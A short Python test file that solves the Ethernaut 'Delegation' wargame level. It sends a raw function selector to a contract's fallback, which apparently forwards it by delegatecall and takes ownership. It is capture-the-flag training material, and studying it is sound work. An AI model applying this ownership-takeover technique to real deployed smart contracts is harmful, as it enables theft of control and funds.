from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv06_delegation import Delegate, Delegation


@default_chain.connect()
def test_level_06():
    service = EthernautDeployer(default_chain)
    contract = service.deploy_lv06()
    do_level_06_solution(contract)
    service.check_lv06(contract)

def do_level_06_solution(contract: Delegation):
    # Training: delegatecall, fallback(), invoking function by function selector 
    contract.transact(b"\xdd\x36\x5b\x8b")
